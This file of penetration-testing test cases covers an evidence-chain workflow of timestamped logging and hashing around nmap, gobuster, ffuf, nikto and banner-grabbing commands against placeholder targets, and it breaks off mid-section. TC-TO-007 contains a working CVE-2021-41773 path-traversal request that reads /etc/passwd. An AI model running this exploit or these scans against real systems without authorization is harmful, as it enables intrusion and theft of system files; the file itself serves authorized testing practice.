# Terminal Operations — Test Cases

> **Companion to**: `SKILL.md` — Terminal operations workflow and evidence chain protocol
> **See also**: `payloads.md` — Command patterns organized by engagement phase

Structured test scenarios for validating the terminal operations workflow. Each test case follows the Evidence Chain Protocol and verifies correct behavior at every phase.

---

## TC-TO-001: Full Reconnaissance Pipeline

**Objective**: Validate that a complete reconnaissance sequence captures evidence at every step with proper timestamping and file integrity verification.

**Severity**: HIGH

**Remediation**: Implement automated evidence capture wrappers that enforce timestamping and hashing; use session recording (script/asciinema) as a baseline guarantee.

**Pass Criteria**:
- [ ] Evidence directory structure created with 4 subdirectories
- [ ] Scope confirmation logged before any command execution
- [ ] Host sweep output in 3 formats (.nmap, .xml, .gnmap)
- [ ] Service scan with version info captured
- [ ] Web technology and header data captured
- [ ] Directory listing output file exists
- [ ] Hash file generated with entries matching evidence file count

**Scenario**: Execute a complete reconnaissance sequence against a target — from network sweep through service enumeration to web discovery — verifying evidence capture at every step.

**Pre-conditions**:

| Item | Requirement |
|------|-------------|
| Target | Authorized target within signed scope |
| Network | Attacker machine has confirmed connectivity to target |
| Tools | nmap, curl, whatweb, gobuster/ffuf installed and in PATH |
| Storage | Evidence directory created and writable |
| Session | Recording started via `script` |

**Test Steps**:

1. Create evidence directory structure:
   ```bash
   mkdir -p evidence/<target>/{scans,exploits,post,screenshots}
   echo "=== SESSION START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee evidence.log
   ```

2. Verify scope compliance:
   ```bash
   # Confirm target IP/domain is within authorized scope
   echo "TARGET: <target> | SCOPE: <authorized_range> | STATUS: confirmed" | tee -a evidence.log
   ```

3. Run host discovery sweep:
   ```bash
   nmap -sn -oA evidence/<target>/scans/sweep_<timestamp> <target>/CIDR | tee -a evidence.log
   ```

4. Run TCP SYN scan with service detection:
   ```bash
   nmap -sS -sV -sC -oA evidence/<target>/scans/syn_<timestamp> <target> | tee -a evidence.log
   ```

5. Run web fingerprinting on discovered HTTP ports:
   ```bash
   whatweb -v http://<target> | tee -a evidence.log
   curl -v -sS -o /dev/null http://<target> 2>&1 | tee -a evidence.log
   ```

6. Run directory discovery:
   ```bash
   gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt \
     -o evidence/<target>/scans/gobuster_<timestamp>.txt | tee -a evidence.log
   ```

7. Generate evidence hashes:
   ```bash
   find evidence/<target> -type f -exec sha256sum {} \; \
     > evidence/<target>/evidence_hashes_<timestamp>.txt
   ```

**Expected Outcomes**:

| Step | Expected Result | Verification |
|------|----------------|--------------|
| 1 | Directory structure created | `ls evidence/<target>/` shows 4 subdirectories |
| 2 | Scope confirmation logged | evidence.log contains scope confirmation line |
| 3 | Sweep output in 3 formats (.nmap, .xml, .gnmap) | All 3 files exist and are non-empty |
| 4 | Service scan with version info captured | Open ports listed with service names and versions |
| 5 | Web technology and header data captured | evidence.log contains HTTP headers and tech stack |
| 6 | Directory listing captured | Output file exists with discovered paths |
| 7 | Hash file generated with entries for all evidence | hash count matches file count in evidence directory |

**Post-conditions**:

- All output files exist in `evidence/<target>/scans/`
- evidence.log contains timestamped entries for every command
- Evidence hash file matches all collected files
- No commands executed against out-of-scope targets

---

## TC-TO-002: Evidence Chain Integrity

**Objective**: Execute a sequence of terminal commands and verify that the evidence chain is complete, timestamped, and tamper-evident at every step.

**Severity**: HIGH

**Scenario**: Execute a sequence of terminal commands and verify that the evidence chain is complete, timestamped, and tamper-evident at every step.

**Remediation**: If gaps are found in the evidence chain (missing ACTION_START/END markers), implement wrapper functions that automatically add chain markers around every tool execution. Use signed hashes (GPG) for tamper-proof evidence chains in high-stakes engagements.

**Pass Criteria**:
- [ ] ACTION_START count equals number of executed actions
- [ ] ACTION_END count equals ACTION_START count
- [ ] Timestamps are monotonically increasing (ACTION_END after ACTION_START)
- [ ] All file hashes in final_hashes file match current file state
- [ ] evidence.log contains complete chain from CHAIN_INIT to CHAIN_CLOSE

**Pre-conditions**:

| Item | Requirement |
|------|-------------|
| Target | Any authorized target |
| Session | script recording active |
| Tools | Standard Kali tools available |

**Test Steps**:

1. Initialize evidence chain:
   ```bash
   echo "CHAIN_INIT: $(date -u +%Y-%m-%dT%H:%M:%SZ) | SESSION: $(basename $SCRIPT_NAME)" \
     | tee -a evidence.log
   ```

2. Execute command with full evidence capture:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo "ACTION: nmap SYN scan" | tee -a evidence.log
   echo "TARGET: <target>" | tee -a evidence.log
   echo "COMMAND: nmap -sS -sV -oA scans/chain_test_<timestamp> <target>" | tee -a evidence.log
   nmap -sS -sV -oA evidence/<target>/scans/chain_test_<timestamp> <target> | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

3. Verify output files were created:
   ```bash
   ls -la evidence/<target>/scans/chain_test_<timestamp>.* | tee -a evidence.log
   ```

4. Record file hashes immediately:
   ```bash
   sha256sum evidence/<target>/scans/chain_test_<timestamp>.* | tee -a evidence.log
   ```

5. Execute a second command building on the first:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo "ACTION: service enumeration on discovered port" | tee -a evidence.log
   nmap -sV -p <port> -sC <target> | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

6. Close evidence chain:
   ```bash
   echo "CHAIN_CLOSE: $(date -u +%Y-%m-%dT%H:%M:%SZ) | TOTAL_ACTIONS: 2" | tee -a evidence.log
   find evidence/ -type f -exec sha256sum {} \; > evidence/final_hashes_<timestamp>.txt
   ```

7. Verify chain completeness:
   ```bash
   grep -c "ACTION_START" evidence.log
   grep -c "ACTION_END" evidence.log
   grep -c "STATUS:" evidence.log
   ```

**Expected Outcomes**:

| Check | Expected Result |
|-------|-----------------|
| ACTION_START count | Equals number of executed actions (2) |
| ACTION_END count | Equals ACTION_START count (2) |
| STATUS count | Equals ACTION_START count (2) |
| Timestamp order | Each ACTION_END timestamp after corresponding ACTION_START |
| File hashes | All hashes in final_hashes file match current file state |
| Output files | chain_test files (.nmap, .xml, .gnmap) exist and non-empty |
| Evidence log | Contains complete chain from CHAIN_INIT to CHAIN_CLOSE |

**Post-conditions**:

- evidence.log contains a complete, ordered chain of actions
- Every action has START, metadata (ACTION/TARGET/COMMAND), STATUS, and END markers
- Final hash file covers all evidence files
- No gaps in the timestamp sequence

---

## TC-TO-003: Error Recovery Workflow

**Objective**: Simulate tool failures and verify that the debugging and fallback process follows the terminal-ops methodology (Phase 2: Read the Failing Surface).

**Severity**: MEDIUM

**Scenario**: Simulate tool failures and verify that the debugging and fallback process follows the terminal-ops methodology (Phase 2: Read the Failing Surface).

**Remediation**: If error recovery fails, ensure the fallback tool is installed and in PATH before engagement start. Pre-configure alternative tools for every critical tool in the toolkit. Document all fallback chains in the engagement runbook.

**Pass Criteria**:
- [ ] Error output captured in evidence log
- [ ] Error state explicitly logged with DEBUG markers
- [ ] Tool version and network state logged for diagnosis
- [ ] Fallback command executed and output captured
- [ ] Fallback output contains actionable results
- [ ] Recovery summary written to evidence log

**Pre-conditions**:

| Item | Requirement |
|------|-------------|
| Target | Authorized target (can be localhost for testing) |
| Tools | nmap, curl, netcat available |
| Evidence | Recording active |

**Test Steps**:

1. Simulate a tool failure — nmap against unreachable port:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   nmap -p 99999 <nonexistent_target> 2>&1 | tee -a evidence.log
   ```

2. Capture the error state:
   ```bash
   echo "ERROR_DETECTED: nmap returned non-zero or unexpected result" | tee -a evidence.log
   echo "DEBUG: Checking network connectivity" | tee -a evidence.log
   ping -c 1 <target> 2>&1 | tee -a evidence.log
   ```

3. Diagnose using Phase 2 steps:
   ```bash
   # Inspect the error message — already captured in evidence.log
   echo "DEBUG: Inspecting tool version" | tee -a evidence.log
   nmap --version | tee -a evidence.log
   echo "DEBUG: Inspecting network state" | tee -a evidence.log
   ip route get <target> 2>&1 | tee -a evidence.log
   ```

4. Apply fallback approach:
   ```bash
   echo "FALLBACK: Switching to alternative scan method" | tee -a evidence.log
   # If SYN scan fails, try connect scan
   nmap -sT -p 80,443,22 <target> 2>&1 | tee -a evidence.log
   echo "STATUS: executed (fallback)" | tee -a evidence.log
   ```

5. Verify fallback succeeded:
   ```bash
   echo "VERIFICATION: Checking fallback results" | tee -a evidence.log
   # Confirm output contains useful data
   grep -E "open|closed|filtered" evidence.log | tail -5 | tee -a evidence.log
   ```

6. Log recovery summary:
   ```bash
   echo "RECOVERY_SUMMARY: Original tool failed, fallback succeeded" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

**Expected Outcomes**:

| Step | Expected Result |
|------|-----------------|
| 1 | Error output captured in evidence log |
| 2 | Error state explicitly logged with DEBUG markers |
| 3 | Tool version and network state logged for diagnosis |
| 4 | Fallback command executed and output captured |
| 5 | Fallback output contains actionable results |
| 6 | Recovery summary written to evidence log |

**Post-conditions**:

- Evidence log shows complete error, diagnosis, and recovery trail
- No blind retries without diagnosis (Phase 2 enforced)
- Fallback approach documented with rationale
- Recovery summary available for post-engagement review

---

## TC-TO-004: Scope-Compliant Execution

**Objective**: Run commands against authorized targets while verifying that scope boundaries are checked before and after every execution phase.

**Severity**: HIGH

**Scenario**: Run commands against authorized targets while verifying that scope boundaries are checked before and after every execution phase.

**Remediation**: If scope violations are detected, stop all operations immediately and report the violation. Implement automated scope validation scripts that run before every tool execution. Use IP range validation functions to catch edge cases (broadcast, network addresses).

**Pass Criteria**:
- [ ] Scope definition logged before any command execution
- [ ] Every target verified against scope before scanning
- [ ] Only confirmed in-scope targets scanned
- [ ] No out-of-scope IPs in scan results (or flagged if found)
- [ ] Unexpected discoveries logged but not probed
- [ ] Scope compliance summary shows zero violations

**Pre-conditions**:

| Item | Requirement |
|------|-------------|
| Scope document | Signed scope defining authorized targets and boundaries |
| Target list | Specific IPs/domains confirmed in scope |
| Tools | nmap, curl available |
| Evidence | Recording active |

**Test Steps**:

1. Define and log the authorized scope:
   ```bash
   echo "SCOPE_DEFINITION: <authorized_range> | SOURCE: <scope_document>" | tee -a evidence.log
   echo "AUTHORIZED_TARGETS: <target1>, <target2>, ..." | tee -a evidence.log
   ```

2. Pre-execution scope check — verify target is authorized:
   ```bash
   TARGET="<target>"
   # Verify target falls within scope
   echo "PRE_CHECK: Target $TARGET against scope <authorized_range>" | tee -a evidence.log
   # If target not in scope: log and STOP
   # if [[ ! "$TARGET" =~ <scope_pattern> ]]; then
   #   echo "BLOCKED: Target $TARGET is outside authorized scope" | tee -a evidence.log
   #   exit 1
   # fi
   echo "PRE_CHECK_RESULT: Target $TARGET is within scope" | tee -a evidence.log
   ```

3. Execute command against confirmed target:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   nmap -sS -sV -oA evidence/scans/scope_test_<timestamp> <target> | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

4. Post-execution scope verification — confirm no out-of-scope targets contacted:
   ```bash
   echo "POST_CHECK: Verifying no out-of-scope targets in scan results" | tee -a evidence.log
   # Check scan output for unexpected IPs
   grep -E "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" evidence/scans/scope_test_<timestamp>.nmap \
     | while read ip rest; do
         echo "VERIFYING: $ip against scope" | tee -a evidence.log
       done
   echo "POST_CHECK_RESULT: All targets within scope" | tee -a evidence.log
   ```

5. Handle accidental scope boundary encounter:
   ```bash
   # Simulate discovering an adjacent system
   echo "UNEXPECTED_FINDING: Discovered <adjacent_ip> — NOT in scope" | tee -a evidence.log
   echo "ACTION: Logging finding, NOT probing further" | tee -a evidence.log
   echo "STATUS: blocked (out of scope)" | tee -a evidence.log
   ```

6. Generate scope compliance summary:
   ```bash
   echo "SCOPE_SUMMARY:" | tee -a evidence.log
   echo "  Authorized range: <authorized_range>" | tee -a evidence.log
   echo "  Targets scanned: <target> (confirmed in scope)" | tee -a evidence.log
   echo "  Out-of-scope encounters: <adjacent_ip> (logged, not probed)" | tee -a evidence.log
   echo "  Scope violations: 0" | tee -a evidence.log
   ```

**Expected Outcomes**:

| Check | Expected Result |
|-------|-----------------|
| Scope definition | Logged before any command execution |
| Pre-check | Every target verified against scope before scanning |
| Scan execution | Only confirmed targets scanned |
| Post-check | No out-of-scope IPs in scan results (or flagged if found) |
| Unexpected findings | Logged but not probed — blocked status recorded |
| Compliance summary | Zero scope violations in final summary |

**Post-conditions**:

- Evidence log contains pre-check and post-check for every action
- All executed commands target only in-scope systems
- Any out-of-scope discoveries logged with blocked status
- Scope compliance summary available for report

---

## TC-TO-005: Multi-Session Evidence Aggregation

**Objective**: Validate that evidence from multiple terminal sessions can be aggregated into a unified timeline with cross-session correlation and integrity verification.

**Severity**: MEDIUM

**Pre-conditions**:

| Item | Requirement |
|------|-------------|
| Sessions | At least 2 prior session recordings available |
| Tools | script, sha256sum, sort, awk available |
| Evidence | Prior evidence directories with timestamped logs |

**Test Steps**:

1. List all available session evidence:
   ```bash
   find evidence/ -name "evidence.log" -type f | sort
   find evidence/ -name "*.typescript" -type f | sort
   ```

2. Extract and merge timelines:
   ```bash
   grep -h "ACTION_START\|ACTION_END" evidence/*/evidence.log \
     | sort -t' ' -k2 > evidence/merged_timeline.txt
   wc -l evidence/merged_timeline.txt
   ```

3. Verify cross-session hash integrity:
   ```bash
   for hashfile in evidence/*/final_hashes_*.txt; do
     echo "=== Verifying: $hashfile ===" | tee -a evidence/integrity_check.log
     sha256sum -c "$hashfile" 2>&1 | tee -a evidence/integrity_check.log
   done
   ```

4. Generate aggregated summary:
   ```bash
   echo "AGGREGATION_SUMMARY:" | tee evidence/aggregated_report.txt
   echo "  Sessions: $(find evidence/ -name 'evidence.log' | wc -l)" | tee -a evidence/aggregated_report.txt
   echo "  Total actions: $(grep -ch 'ACTION_START' evidence/*/evidence.log | awk '{s+=$1}END{print s}')" | tee -a evidence/aggregated_report.txt
   echo "  Time span: $(head -1 evidence/merged_timeline.txt) to $(tail -1 evidence/merged_timeline.txt)" | tee -a evidence/aggregated_report.txt
   ```

**Expected Outcomes**:

| Check | Expected Result |
|-------|-----------------|
| Session discovery | All prior sessions found |
| Timeline merge | Events sorted chronologically across sessions |
| Hash verification | All files pass integrity check |
| Aggregated report | Contains session count, action count, time span |

**Remediation**: Use centralized logging (syslog/ELK) for multi-operator engagements; implement signed evidence chains with GPG for tamper-proof aggregation.

**Pass Criteria**:
- [ ] All prior sessions discovered and listed
- [ ] Merged timeline sorted chronologically across sessions
- [ ] All evidence files pass hash integrity check
- [ ] Aggregated report contains session count, action count, and time span

**Post-conditions**:

- Merged timeline contains all actions from all sessions in chronological order
- Integrity check passes for all evidence files
- Aggregated report provides engagement-level overview

---

## TC-TO-006: Web Application Enumeration Pipeline

**Objective**: Validate that a complete web application enumeration sequence captures technology stack, hidden paths, parameters, and API endpoints with proper evidence at every step.

**Severity**: HIGH

**Scenario**: Execute a full web application enumeration pipeline against an authorized target, discovering technologies, directories, parameters, and API surface with timestamped evidence capture.

**Prerequisites**:

| Item | Requirement |
|------|-------------|
| Target | Authorized web application URL |
| Tools | whatweb, nikto, gobuster/ffuf, ffuf, curl installed |
| Evidence | Recording active, evidence directory created |
| Scope | URL confirmed within authorized scope |

**Remediation**: If enumeration reveals sensitive paths or API endpoints, document them as findings and test for authentication bypass. If rate limiting is encountered, reduce thread count and add inter-request delays. Report all discovered attack surface for prioritized testing.

**Test Steps**:

1. Web technology fingerprinting:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo "ACTION: Technology fingerprinting" | tee -a evidence.log
   whatweb -v -a 3 http://<target> 2>&1 | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

2. vulnerability scanner:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   nikto -h http://<target> -output evidence/nikto_<timestamp>.txt 2>&1 | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

3. Directory and file discovery:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -t 20 -o evidence/gobuster_<timestamp>.txt 2>&1 | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

4. Parameter fuzzing:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ffuf -u "http://<target>/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc 200,301,302,403,500 -o evidence/params_<timestamp>.json 2>&1 | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

5. Generate evidence hashes:
   ```bash
   find evidence/ -type f -exec sha256sum {} \; > evidence/web_enum_hashes_<timestamp>.txt
   ```

**Expected Outcomes**:

| Step | Expected Result | Verification |
|------|-----------------|--------------|
| 1 | Technology stack identified (server, framework, CMS) | evidence.log contains whatweb output |
| 2 | Known vulnerabilities listed | nikto output file non-empty with findings |
| 3 | Hidden directories discovered | gobuster output lists 10+ paths |
| 4 | Valid parameters identified | params JSON file contains accepted parameters |
| 5 | All evidence hashed | Hash count matches file count |

**Pass Criteria**:
- [ ] Technology stack documented (server, language, framework, CMS)
- [ ] Directory listing captured with at least 10 discovered paths
- [ ] Parameter names identified for further testing
- [ ] All actions logged with ACTION_START/ACTION_END markers
- [ ] Evidence hashes match all collected files

**Post-conditions**:

- All output files exist in evidence directory
- evidence.log contains timestamped entries for every command
- Web attack surface fully documented for next testing phase

---

## TC-TO-007: Exploit Execution and Verification

**Objective**: Validate that exploit execution against an authorized target follows the terminal-ops methodology with complete evidence capture, result verification, and safe rollback.

**Severity**: CRITICAL

**Scenario**: Execute a confirmed exploit (e.g., CVE-2021-41773 path traversal) against an authorized target in the lab environment, capturing every step with evidence and verifying the result.

**Prerequisites**:

| Item | Requirement |
|------|-------------|
| Target | Authorized target with confirmed vulnerability |
| Exploit | Validated exploit from lab testing (TC-SF-001 or similar) |
| Evidence | Recording active, pre-exploit state captured |
| Scope | Target confirmed within authorized scope |
| Rollback | Remediation plan documented before execution |

**Remediation**: If exploit causes unintended damage, execute rollback plan immediately. If exploit fails, verify the target version matches the lab-tested version. Document all execution attempts including failures for the engagement report.

**Test Steps**:

1. Pre-exploit state capture:
   ```bash
   echo "=== PRE_EXPLOIT $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo "EXPLOIT: CVE-2021-41773 (Apache Path Traversal)" | tee -a evidence.log
   echo "TARGET: <target>" | tee -a evidence.log
   curl -s -o /dev/null -w "%{http_code}" http://<target> | tee -a evidence.log
   echo "STATUS: pre-exploit state captured" | tee -a evidence.log
   ```

2. Execute exploit:
   ```bash
   echo "=== EXPLOIT_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   curl -s -o evidence/exploit_response_<timestamp>.txt \
     "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd" \
     -w "\nHTTP_CODE: %{http_code}\n" | tee -a evidence.log
   echo "STATUS: exploit executed" | tee -a evidence.log
   echo "=== EXPLOIT_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

3. Verify exploit result:
   ```bash
   echo "=== VERIFY_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   grep -q "root:x:0:0" evidence/exploit_response_<timestamp>.txt
   if [ $? -eq 0 ]; then
     echo "RESULT: EXPLOIT SUCCESSFUL — /etc/passwd contents extracted" | tee -a evidence.log
   else
     echo "RESULT: EXPLOIT UNSUCCESSFUL — target may be patched" | tee -a evidence.log
   fi
   echo "=== VERIFY_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

4. Capture post-exploit evidence:
   ```bash
   sha256sum evidence/exploit_response_<timestamp>.txt | tee -a evidence.log
   echo "POST_EXPLOIT_CHECKS:" | tee -a evidence.log
   curl -s -o /dev/null -w "TARGET_STATUS: %{http_code}\n" http://<target> | tee -a evidence.log
   ```

**Expected Outcomes**:

| Step | Expected Result | Verification |
|------|-----------------|--------------|
| 1 | Pre-exploit HTTP status captured | evidence.log contains pre-exploit status |
| 2 | Exploit executed with response saved | exploit_response file non-empty |
| 3 | Result verified (success/failure) | VERIFY log entry present with clear result |
| 4 | Post-exploit evidence hashed | Hash recorded for exploit response |

**Pass Criteria**:
- [ ] Pre-exploit target state documented (HTTP status, service state)
- [ ] Exploit executed with full response captured in evidence file
- [ ] Result verified: SUCCESS or FAILURE clearly logged
- [ ] Post-exploit target health verified (service still running)
- [ ] All actions use ACTION_START/ACTION_END markers

**Post-conditions**:

- Exploit response file exists with tamper-evident hash
- evidence.log shows complete execution timeline
- Target service health verified post-exploitation

---

## TC-TO-008: Log Review and Analysis Pipeline

**Objective**: Validate that system and application log review follows a structured methodology, capturing relevant security events with timestamped evidence for the engagement report.

**Severity**: MEDIUM

**Scenario**: Review system and application logs on an authorized target to identify security-relevant events (failed logins, privilege escalation, suspicious processes) with structured evidence capture.

**Prerequisites**:

| Item | Requirement |
|------|-------------|
| Target | Authorized system with log access (SSH or local) |
| Logs | /var/log/ accessible, journalctl available |
| Evidence | Recording active, evidence directory created |
| Scope | Log review authorized in engagement scope |

**Remediation**: If log review reveals active compromise indicators (ongoing lateral movement, active backdoors), immediately notify the operator and pause the engagement scope to address the active threat. If logs are incomplete, verify log rotation configuration and note the gap in the engagement report.

**Test Steps**:

1. Capture system authentication log:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo "ACTION: Authentication log review" | tee -a evidence.log
   sudo cat /var/log/auth.log 2>/dev/null || sudo journalctl -u sshd --no-pager | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

2. Capture failed login attempts:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo "ACTION: Failed login analysis" | tee -a evidence.log
   sudo grep -i "failed\|failure\|invalid" /var/log/auth.log 2>/dev/null | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

3. Capture privilege escalation events:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo "ACTION: Privilege escalation log review" | tee -a evidence.log
   sudo grep -i "sudo\|su\|root" /var/log/auth.log 2>/dev/null | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

4. Capture application error log:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo "ACTION: Application error log review" | tee -a evidence.log
   sudo tail -500 /var/log/apache2/error.log 2>/dev/null || sudo tail -500 /var/log/nginx/error.log 2>/dev/null | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

5. Generate log analysis summary:
   ```bash
   echo "LOG_SUMMARY:" | tee -a evidence.log
   echo "  Failed logins: $(grep -ci 'failed' evidence.log 2>/dev/null || echo 'N/A')" | tee -a evidence.log
   echo "  Sudo events: $(grep -ci 'sudo' evidence.log 2>/dev/null || echo 'N/A')" | tee -a evidence.log
   echo "  App errors: $(grep -ci 'error' evidence.log 2>/dev/null || echo 'N/A')" | tee -a evidence.log
   ```

**Expected Outcomes**:

| Step | Expected Result | Verification |
|------|-----------------|--------------|
| 1 | Authentication events captured | evidence.log contains auth entries |
| 2 | Failed logins listed with source IPs | Failed login count > 0 or confirmed zero |
| 3 | Sudo/su events documented | Privilege escalation events listed |
| 4 | Application errors captured | Error log tail present in evidence |
| 5 | Summary generated | Counts for each category present |

**Pass Criteria**:
- [ ] Authentication log reviewed with failed/successful login events
- [ ] Privilege escalation events documented
- [ ] Application error log captured
- [ ] Summary statistics generated for all log categories
- [ ] All actions logged with ACTION_START/ACTION_END markers

**Post-conditions**:

- evidence.log contains complete log review trail
- Failed login patterns analyzed (brute force indicators)
- Privilege escalation timeline documented

---

## TC-TO-009: Remote Service Enumeration

**Objective**: Validate that remote service enumeration against an authorized target captures service versions, banner information, and potential vulnerabilities with complete evidence.

**Severity**: HIGH

**Scenario**: Enumerate all services on an authorized target by probing common ports, capturing banners, and identifying versions for vulnerability research.

**Prerequisites**:

| Item | Requirement |
|------|-------------|
| Target | Authorized target with multiple running services |
| Tools | nmap, nc, curl, openssl installed |
| Evidence | Recording active, evidence directory created |
| Scope | Target confirmed within authorized scope |

**Remediation**: If outdated service versions are discovered, document them with CVE references for the engagement report. If unexpected services are found (not in scope documentation), verify they are in-scope before further testing. Report all service versions with associated known vulnerabilities.

**Test Steps**:

1. Full TCP port scan with version detection:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   nmap -sS -sV -sC -p- -T4 --version-intensity 5 \
     -oA evidence/full_scan_<timestamp> <target> 2>&1 | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

2. UDP scan on top 100 ports:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   sudo nmap -sU -sV --top-ports 100 -T4 \
     -oA evidence/udp_scan_<timestamp> <target> 2>&1 | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

3. Banner grabbing on discovered ports:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   for port in 21 22 25 80 110 143 443 993 995 3306 5432 8080 8443; do
     echo "PROBING: <target>:$port" | tee -a evidence.log
     timeout 5 bash -c "echo '' | nc -w 3 <target> $port 2>&1" | tee -a evidence.log
   done
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

4. SSL/TLS certificate analysis:
   ```bash
   echo "=== ACTION_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo | openssl s_client -connect <target>:443 -servername <target> 2>/dev/null | \
     openssl x509 -noout -text 2>/dev/null | tee -a evidence.log
   echo "STATUS: executed" | tee -a evidence.log
   echo "=== ACTION_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   ```

5. Generate service inventory:
   ```bash
   echo "SERVICE_INVENTORY:" | tee -a evidence.log
   grep "open" evidence/full_scan_<timestamp>.nmap | tee -a evidence.log
   find evidence/ -type f -exec sha256sum {} \; > evidence/service_enum_hashes_<timestamp>.txt
   ```

**Expected Outcomes**:

| Step | Expected Result | Verification |
|------|-----------------|--------------|
| 1 | Full TCP port scan with versions | .nmap, .xml, .gnmap files exist |
| 2 | UDP scan on top 100 ports | UDP scan results captured |
| 3 | Banners grabbed on key ports | Banner text present for responsive ports |
| 4 | SSL certificate details captured | Certificate subject, issuer, dates present |
| 5 | Service inventory generated | Open port list extracted from scan |

**Pass Criteria**:
- [ ] All TCP ports scanned (1-65535)
- [ ] Service versions identified for all open ports
- [ ] Banners captured for at least 5 common service ports
- [ ] SSL/TLS certificate analyzed if HTTPS present
- [ ] Complete service inventory with version numbers
- [ ] All evidence files hashed for integrity

**Post-conditions**:

- evidence directory contains full scan, UDP scan, and banner files
- Service inventory available for vulnerability research phase
- All evidence hashed and timestamped

---

## TC-TO-010: Automated Cleanup and Report Generation

**Objective**: Validate that engagement cleanup removes all temporary artifacts and generates a final evidence report with integrity verification, following the terminal-ops evidence chain protocol.

**Severity**: MEDIUM

**Scenario**: At the end of an engagement, perform automated cleanup of all temporary files, verify no sensitive artifacts remain, and generate a comprehensive evidence report with hash verification.

**Prerequisites**:

| Item | Requirement |
|------|-------------|
| Evidence | All engagement evidence files collected |
| Tools | sha256sum, find, sort, awk available |
| Scope | Cleanup plan reviewed and approved by operator |
| Report | Evidence directory organized by phase |

